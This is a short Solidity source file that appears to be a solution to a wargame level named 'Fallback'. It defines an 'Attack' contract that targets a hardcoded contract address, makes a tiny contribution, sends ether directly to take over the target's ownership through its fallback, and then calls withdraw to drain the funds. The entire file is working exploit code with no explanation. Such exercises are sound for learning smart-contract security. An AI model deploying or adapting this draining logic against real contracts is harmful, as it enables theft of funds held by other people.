pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    Fallback pwned = Fallback(0x18DEcB689fabB67F2A583Be640AF0c6f6bEB0F51);

    function fundAndDrain() public {
        pwned.contribute.value(1 * 10**14)();
        address(pwned).call.value(1 * 10**14)("");
        pwned.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
